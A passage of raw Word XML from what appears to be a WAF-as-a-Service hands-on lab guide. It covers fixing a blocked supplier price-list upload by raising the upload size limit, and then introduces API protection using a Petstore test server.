      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> suppliers is having trouble uploading their price lists</w:t>
      </w:r>
      <w:r w:rsidR="7A2FB86E" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="006E0F4F" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Our supplier</w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> is going to the “</w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Supplier Login</w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">” section, entering </w:t>
      </w:r>
      <w:r w:rsidR="1D181119" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>their</w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> email </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>big@spender.com</w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> ,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="6E0FE968" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>their</w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> password “</w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>money</w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">”, and clicking </w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Login</w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="20B7B257" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="16B731DE" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Our </w:t>
      </w:r>
      <w:r w:rsidR="184C1F62" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">supplier has made the price list for you to </w:t>
      </w:r>
      <w:r w:rsidR="250E3AA8" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">use for </w:t>
      </w:r>
      <w:r w:rsidR="184C1F62" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>troubleshoot</w:t>
      </w:r>
      <w:r w:rsidR="24597F88" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidR="184C1F62" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> available at</w:t>
      </w:r>
      <w:r w:rsidR="0BFC8791" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> the following link</w:t>
      </w:r>
      <w:r w:rsidR="184C1F62" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:hyperlink r:id="rId63" w:history="1">
        <w:r w:rsidR="00647DA6" w:rsidRPr="00FB46C8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
            <w:i/>
            <w:iCs/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://sabrett1.blob.core.windows.net/testdrive/pricelist.dat</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="486B1EE9" w14:textId="42624E77" w:rsidR="00FF500C" w:rsidRDefault="385202E8" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Save the</w:t>
      </w:r>
      <w:r w:rsidR="007E022A">
        <w:t xml:space="preserve"> pricelist.dat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file to your computer   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE470DC" w14:textId="4671EAED" w:rsidR="00662E89" w:rsidRDefault="007B3BC3" w:rsidP="00662E89">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browse to your </w:t>
      </w:r>
      <w:r w:rsidRPr="0015168C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="00662E89">
        <w:t xml:space="preserve">, for example:  </w:t>
      </w:r>
      <w:hyperlink r:id="rId64" w:history="1">
        <w:r w:rsidR="00662E89" w:rsidRPr="006B31C7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://app######.prod.cudawaas.com/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4AAC09A1" w14:textId="696A6601" w:rsidR="00FF500C" w:rsidRDefault="385202E8" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click on </w:t>
      </w:r>
      <w:r w:rsidRPr="007E022A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Supplier Login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B29CB2" w14:textId="3EC123DC" w:rsidR="00FF500C" w:rsidRDefault="005A2E0C" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="005A2E0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Login</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r w:rsidR="385202E8">
        <w:t xml:space="preserve">email: </w:t>
      </w:r>
      <w:r w:rsidR="385202E8" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>big@spender.com</w:t>
      </w:r>
      <w:r w:rsidR="385202E8">
        <w:t xml:space="preserve"> and password: </w:t>
      </w:r>
      <w:r w:rsidR="385202E8" w:rsidRPr="00FB46C8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>money</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A0B10F" w14:textId="531CE2D5" w:rsidR="00FF500C" w:rsidRDefault="2FF406C5" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00AE2927">
        <w:t xml:space="preserve">lick </w:t>
      </w:r>
      <w:r w:rsidR="005A2E0C" w:rsidRPr="005A2E0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00AE2927" w:rsidRPr="005A2E0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">hoose </w:t>
      </w:r>
      <w:r w:rsidR="005A2E0C" w:rsidRPr="005A2E0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidR="00AE2927" w:rsidRPr="005A2E0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ile</w:t>
      </w:r>
      <w:r w:rsidR="00AE2927">
        <w:t>, select t</w:t>
      </w:r>
      <w:r w:rsidR="76F6E819">
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r w:rsidR="005A2E0C">
        <w:t xml:space="preserve">pricelist.dat </w:t>
      </w:r>
      <w:r w:rsidR="00AE2927">
        <w:t>file</w:t>
      </w:r>
      <w:r w:rsidR="5283F71B">
        <w:t xml:space="preserve"> you saved</w:t>
      </w:r>
      <w:r w:rsidR="00AE2927">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00FF500C">
        <w:t xml:space="preserve">enter a filename of “my-pricelist.doc”, and click </w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="005A2E0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Upload</w:t>
      </w:r>
      <w:r w:rsidR="00FF500C">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FAD9296" w14:textId="3ECAEB00" w:rsidR="687CA52E" w:rsidRDefault="4B8AB2B2" w:rsidP="00172641">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="392AB527" wp14:editId="78837EE4">
            <wp:extent cx="1926084" cy="1667665"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1569228050" name="Picture 156922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22805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26084" cy="1667665"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="4960FEF7">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="433D0333" wp14:editId="5AF9F2EC">
            <wp:extent cx="2867025" cy="1699999"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="623780379" name="Picture 62378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79"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId66">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2867025" cy="1699999"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="716C5B28" w14:textId="1B2D0413" w:rsidR="0549F914" w:rsidRDefault="0549F914" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Review the firewall log entry to see why it was blocked</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2C79CB" w14:textId="1E9669BC" w:rsidR="00FF500C" w:rsidRDefault="778FF361" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Go to </w:t>
      </w:r>
      <w:r w:rsidR="00FF500C">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00FF500C" w:rsidRPr="32F6121D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Parameter Protection</w:t>
      </w:r>
      <w:r w:rsidR="00FF500C">
        <w:t xml:space="preserve"> component</w:t>
      </w:r>
      <w:r w:rsidR="27371931">
        <w:t xml:space="preserve"> you previously </w:t>
      </w:r>
      <w:r w:rsidR="0A9720DC">
        <w:t>added.</w:t>
      </w:r>
      <w:r w:rsidR="27371931">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003D9E00" w14:textId="6FD3ECB9" w:rsidR="00FF500C" w:rsidRDefault="00FF500C" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Find the Max Upload File Size input and change it to 10240 (10MB).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302D6800" w14:textId="66748993" w:rsidR="00FF500C" w:rsidRPr="00FF500C" w:rsidRDefault="00FF500C" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Click Save.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD1579D" w14:textId="77777777" w:rsidR="00D5628E" w:rsidRDefault="2CFD1F03" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Test again</w:t>
      </w:r>
      <w:r w:rsidR="00D5628E">
        <w:t xml:space="preserve"> and verify you can upload your file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C65440D" w14:textId="36E86E04" w:rsidR="27A2EE48" w:rsidRDefault="2CFD1F03" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="44EEB6D4">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3673FD4D" wp14:editId="17F26848">
            <wp:extent cx="2213162" cy="756164"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="119255084" name="Picture 11925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5508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13162" cy="756164"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F04796" w14:textId="76F3B218" w:rsidR="00D5628E" w:rsidRDefault="00D5628E" w:rsidP="00172641">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3B81E8" w14:textId="1BFB755D" w:rsidR="326B0EE2" w:rsidRDefault="66F17F32" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="83" w:name="_Toc401463570"/>
      <w:bookmarkStart w:id="84" w:name="_Toc72791985"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>API Protection</w:t>
      </w:r>
      <w:bookmarkStart w:id="85" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="83"/>
      <w:bookmarkEnd w:id="84"/>
      <w:bookmarkEnd w:id="85"/>
    </w:p>
    <w:p w14:paraId="5ADC236F" w14:textId="3554C94F" w:rsidR="00D5628E" w:rsidRDefault="00AC4B49" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve">Internet-facing </w:t>
      </w:r>
      <w:r w:rsidR="00D5628E" w:rsidRPr="00D5628E">
        <w:t xml:space="preserve">APIs are </w:t>
      </w:r>
      <w:r w:rsidR="00C34F96">
        <w:t xml:space="preserve">highly </w:t>
      </w:r>
      <w:r w:rsidR="00D5628E" w:rsidRPr="00D5628E">
        <w:t>prevalent today. The number of systems that speak to each other to accomplish various functions – from buying a phone on a payment plan to paying for lunch online – is enormous, and all of them use APIs. APIs require significant security</w:t>
      </w:r>
      <w:r w:rsidR="008A0072">
        <w:t xml:space="preserve"> at the application layer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="518EA505" w14:textId="022DC19A" w:rsidR="00D5628E" w:rsidRDefault="47E6623A" w:rsidP="00172641">
      <w:r>
        <w:t>WAF-as-a-Service protect</w:t>
      </w:r>
      <w:r w:rsidR="00904143">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="2505EBB2">
        <w:t>API</w:t>
      </w:r>
      <w:r w:rsidR="00904143">
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r w:rsidR="2505EBB2">
        <w:t xml:space="preserve">from </w:t>
      </w:r>
      <w:r>
        <w:t>attacks</w:t>
      </w:r>
      <w:r w:rsidR="00D5628E">
        <w:t xml:space="preserve"> using the following </w:t>
      </w:r>
      <w:r w:rsidR="00AA69C3">
        <w:t>(partial list):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52FC8C42" w14:textId="24B44BF0" w:rsidR="00D5628E" w:rsidRPr="00D5628E" w:rsidRDefault="00D5628E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D5628E">
        <w:t xml:space="preserve">Providing a Secure TLS </w:t>
      </w:r>
      <w:r w:rsidR="004A355A">
        <w:t xml:space="preserve">channel </w:t>
      </w:r>
      <w:r w:rsidRPr="00D5628E">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="004A355A">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D5628E">
        <w:t>API Service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9DAB0D" w14:textId="4408DB6F" w:rsidR="00D5628E" w:rsidRPr="00D5628E" w:rsidRDefault="00D5628E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D5628E">
        <w:t xml:space="preserve">Enforcing </w:t>
      </w:r>
      <w:r w:rsidR="004A355A">
        <w:t xml:space="preserve">HTTP </w:t>
      </w:r>
      <w:r w:rsidRPr="00D5628E">
        <w:t xml:space="preserve">Verb-based Security Constraints </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B7DADA" w14:textId="4094917D" w:rsidR="00D5628E" w:rsidRDefault="00D5628E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Enforcing endpoint and JSON key constraints</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9E4ED7" w14:textId="2627AC34" w:rsidR="00E34FB8" w:rsidRPr="00D5628E" w:rsidRDefault="00E34FB8" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Enforcing Rate-Limits on API endpoints</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2CB3B7" w14:textId="2C2803ED" w:rsidR="00D5628E" w:rsidRPr="00D5628E" w:rsidRDefault="00D5628E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D5628E">
        <w:t xml:space="preserve">Filtering Malicious Data from Untrusted User Inputs </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62834745" w14:textId="4E427177" w:rsidR="00D5628E" w:rsidRPr="00D5628E" w:rsidRDefault="00D5628E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D5628E">
        <w:t>Uninterrupted API Delivery with Virtual Patching</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and Load Balancing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3C44CC" w14:textId="77777777" w:rsidR="00A94591" w:rsidRDefault="3D80FF76" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve">Modern API’s have an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>OpenAPI</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> specification that defines the API</w:t>
      </w:r>
      <w:r w:rsidR="00A94591">
        <w:t xml:space="preserve"> structure</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:r w:rsidR="00D5628E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A677FBF" w14:textId="386F6C32" w:rsidR="47E6623A" w:rsidRDefault="3D80FF76" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve">We </w:t>
      </w:r>
      <w:r w:rsidR="008A0072">
        <w:t xml:space="preserve">will </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">use the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Petstor</w:t>
      </w:r>
      <w:r w:rsidR="008A0072" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008A0072" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> API </w:t>
      </w:r>
      <w:r w:rsidR="0093415B" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
      <w:r w:rsidR="0093415B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EE6625">
        <w:t xml:space="preserve">listening </w:t>
      </w:r>
      <w:r w:rsidR="00EE6625" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">on port </w:t>
      </w:r>
      <w:r w:rsidR="00EE6625" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>8080</w:t>
      </w:r>
      <w:r w:rsidR="00EE6625">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00452BFC">
        <w:t xml:space="preserve">as our test server. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F34298" w14:textId="1FF5A2AA" w:rsidR="005F4B65" w:rsidRPr="005320D4" w:rsidRDefault="005F4B65" w:rsidP="00DA1CD0">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="86" w:name="_Toc72791986"/>
      <w:r w:rsidRPr="005320D4">
        <w:t>Browse to your Backend Server</w:t>
      </w:r>
      <w:bookmarkEnd w:id="86"/>
    </w:p>
    <w:p w14:paraId="334EB6DB" w14:textId="40A886CE" w:rsidR="005F4B65" w:rsidRPr="005320D4" w:rsidRDefault="005F4B65" w:rsidP="005F4B65">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Using the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>API  Server</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from your email browse to the server </w:t>
      </w:r>
      <w:r w:rsidR="72784B74" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>on port 8080</w:t>
      </w:r>
      <w:r w:rsidR="72784B74" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC9D04A" w14:textId="77777777" w:rsidR="005F4B65" w:rsidRPr="005320D4" w:rsidRDefault="005F4B65" w:rsidP="005F4B65">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:t>It may take a few minutes after the Test Drive starts for the Backend Server to instantiate, so if the site does not load, try again in a few minutes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="485F5A51" w14:textId="5D5B11C9" w:rsidR="005B500C" w:rsidRDefault="005F4B65" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note at this point you are going directly to your </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="008A1A6E">
        <w:t>API</w:t>
      </w:r>
      <w:r w:rsidR="001D5D5B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> server</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">, not </w:t>
      </w:r>
      <w:r w:rsidR="003B7661">
        <w:t>through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> WAF-as-a-Service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD462DE" w14:textId="05EDE17A" w:rsidR="005B500C" w:rsidRDefault="00553A72" w:rsidP="00EE6625">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="23F3EAC3" wp14:editId="266F5500">
            <wp:extent cx="3562597" cy="993992"/>
